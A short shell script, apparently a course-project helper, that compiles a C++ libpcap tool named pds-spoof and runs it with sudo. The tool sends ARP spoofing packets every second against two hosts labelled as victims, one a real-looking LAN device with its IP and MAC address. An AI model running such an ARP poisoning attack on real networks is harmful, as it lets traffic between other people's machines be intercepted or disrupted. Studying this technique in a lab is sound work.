SOURCE="pds-spoof.cpp"
EXECUTABLE="pds-spoof"
FLAGS="-std=c++11 -Wall -Wextra -pedantic"
LIB_PCAP="-lpcap"

INTERFACE="wlp3s0"
SPOOF_INTERVAL_MS="1000"
PROTOCOL="arp"

IP_LIBRA="192.168.0.17"
MAC_LIBRA="0019.d2c1.93ab"

IP2="192.168.111.111"
MAC2="dddd.eeee.ffff"

IP1=$IP_LIBRA
MAC1=$MAC_LIBRA

if [ -f $EXECUTABLE ]; then
	sudo rm $EXECUTABLE
fi

echo "-- COMPILATION ----------------------------------------"
g++ $FLAGS $SOURCE -o $EXECUTABLE $LIB_PCAP
echo "-------------------------------------------------------"

if [ -f $EXECUTABLE ]; then
	sudo ./$EXECUTABLE -i $INTERFACE -t $SPOOF_INTERVAL_MS -p $PROTOCOL -victim1ip $IP_LIBRA -victim1mac $MAC_LIBRA -victim2ip $IP2 -victim2mac $MAC2
fi